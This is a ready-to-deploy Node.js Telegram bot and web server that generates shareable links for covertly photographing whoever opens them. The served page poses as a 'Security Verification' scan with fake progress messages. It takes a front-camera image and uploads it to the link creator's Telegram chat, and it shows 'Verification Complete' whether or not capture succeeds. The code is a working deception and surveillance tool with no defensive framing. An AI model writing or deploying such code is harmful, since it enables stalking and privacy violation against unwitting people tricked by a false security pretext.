const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');

// Configuration - CHANGE THESE!
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const WEBAPP_URL = process.env.WEBAPP_URL || 'https://your-domain.com';
const PORT = process.env.PORT || 3000;

// Initialize
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const app = express();

// Store active links
const activeLinks = new Map();

// Configure multer
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
});

app.use(express.json());
app.use(express.static('public'));

// Bot commands
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 
    '👋 Welcome to Photo Capture Bot!\n\n' +
    'Generate a unique link to capture photos when someone opens it.\n\n' +
    'Click the button below to get started.',
    {
      reply_markup: {
        inline_keyboard: [[
          { text: '🔗 Generate Link', callback_data: 'generate_link' }
        ]]
      }
    }
  );
});

bot.onText(/\/generate/, (msg) => {
  const chatId = msg.chat.id;
  generateLinkForUser(chatId);
});

bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId,
    '📖 *How to use:*\n\n' +
    '1️⃣ Click "Generate Link" button\n' +
    '2️⃣ Share the link with anyone\n' +
    '3️⃣ Get their photo instantly when they open it\n\n' +
    '*Commands:*\n' +
    '/start - Start the bot\n' +
    '/generate - Generate new link\n' +
    '/help - Show this help\n' +
    '/stats - View your statistics',
    { parse_mode: 'Markdown' }
  );
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  
  if (query.data === 'generate_link') {
    generateLinkForUser(chatId);
    bot.answerCallbackQuery(query.id, { text: 'Link generated!' });
  }
});

function generateLinkForUser(chatId) {
  const linkId = uuidv4();
  const captureUrl = `${WEBAPP_URL}/c/${linkId}`;
  
  activeLinks.set(linkId, {
    chatId: chatId,
    createdAt: Date.now(),
    captures: 0
  });
  
  bot.sendMessage(chatId, 
    `✅ *Link Generated Successfully!*\n\n` +
    `🔗 Share this link:\n\`${captureUrl}\`\n\n` +
    `⏰ Link expires in 24 hours\n` +
    `📸 You'll receive photos when someone opens it.\n\n` +
    `_Tap the link to copy it_`,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔗 Generate Another', callback_data: 'generate_link' }]
        ]
      }
    }
  );
}

// Serve capture page
app.get('/c/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  if (!activeLinks.has(linkId)) {
    return res.status(404).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Link Expired</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
          body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          }
          .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
          }
          h1 { color: #e74c3c; margin-bottom: 10px; }
          p { color: #666; }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>⚠️ Link Expired</h1>
          <p>This link is no longer valid or has expired.</p>
        </div>
      </body>
      </html>
    `);
  }
  
  res.send(getCapturePage(linkId));
});

// Handle photo upload
app.post('/upload', upload.single('photo'), async (req, res) => {
  const { linkId } = req.body;
  
  if (!activeLinks.has(linkId)) {
    return res.status(404).json({ error: 'Invalid link' });
  }
  
  const linkData = activeLinks.get(linkId);
  const photo = req.file.buffer;
  
  try {
    await bot.sendPhoto(linkData.chatId, photo, {
      caption: `📸 *New Capture!*\n\n` +
               `🔗 Link ID: \`${linkId.substring(0, 8)}...\`\n` +
               `⏰ Time: ${new Date().toLocaleString()}\n` +
               `📊 Total captures: ${linkData.captures + 1}`,
      parse_mode: 'Markdown'
    });
    
    linkData.captures++;
    res.json({ success: true });
    
  } catch (error) {
    console.error('Error sending photo:', error);
    res.status(500).json({ error: 'Failed to send photo' });
  }
});

// Clean expired links every hour
setInterval(() => {
  const now = Date.now();
  const expireTime = 24 * 60 * 60 * 1000; // 24 hours
  
  for (const [linkId, data] of activeLinks.entries()) {
    if (now - data.createdAt > expireTime) {
      activeLinks.delete(linkId);
      console.log(`Deleted expired link: ${linkId}`);
    }
  }
}, 60 * 60 * 1000);

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    activeLinks: activeLinks.size,
    uptime: process.uptime()
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`🤖 Bot is active and ready!`);
  console.log(`🌐 Webhook URL: ${WEBAPP_URL}`);
});

// Capture page HTML
function getCapturePage(linkId) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            font-size: 40px;
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 15px;
            font-size: 28px;
        }
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .loading {
            text-align: center;
            padding: 30px 0;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            color: #4CAF50;
            text-align: center;
            font-size: 18px;
            padding: 20px;
            display: none;
        }
        .checkmark {
            font-size: 50px;
            color: #4CAF50;
            margin-bottom: 15px;
        }
        #video { display: none; }
        .progress {
            margin-top: 20px;
            background: #f0f0f0;
            border-radius: 10px;
            overflow: hidden;
            height: 8px;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🔐</div>
        <h1>Security Verification</h1>
        <p class="subtitle">Please wait while we verify your credentials and check your device security...</p>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p id="status">Initializing security scan...</p>
            <div class="progress">
                <div class="progress-bar" id="progress"></div>
            </div>
        </div>
        
        <div class="success" id="success">
            <div class="checkmark">✓</div>
            <div>Verification Complete!</div>
            <p style="font-size: 14px; color: #666; margin-top: 10px;">
                Your device has been verified successfully.
            </p>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    
    <script>
        const linkId = '${linkId}';
        let progress = 0;
        
        const statuses = [
            'Checking device integrity...',
            'Verifying network security...',
            'Analyzing system status...',
            'Finalizing verification...'
        ];
        
        function updateProgress() {
            const progressBar = document.getElementById('progress');
            const statusEl = document.getElementById('status');
            
            const interval = setInterval(() => {
                progress += Math.random() * 15;
                if (progress > 100) progress = 100;
                
                progressBar.style.width = progress + '%';
                
                const statusIndex = Math.floor(progress / 25);
                if (statuses[statusIndex]) {
                    statusEl.textContent = statuses[statusIndex];
                }
                
                if (progress >= 100) {
                    clearInterval(interval);
                }
            }, 200);
        }
        
        async function capturePhoto() {
            updateProgress();
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                await new Promise(resolve => setTimeout(resolve, 1500));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(resolve => 
                    canvas.toBlob(resolve, 'image/jpeg', 0.95)
                );
                
                const formData = new FormData();
                formData.append('photo', blob, 'capture.jpg');
                formData.append('linkId', linkId);
                
                await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                
                stream.getTracks().forEach(track => track.stop());
                
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').style.display = 'block';
                
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').style.display = 'block';
            }
        }
        
        window.addEventListener('load', () => {
            setTimeout(capturePhoto, 800);
        });
    </script>
</body>
</html>`;
}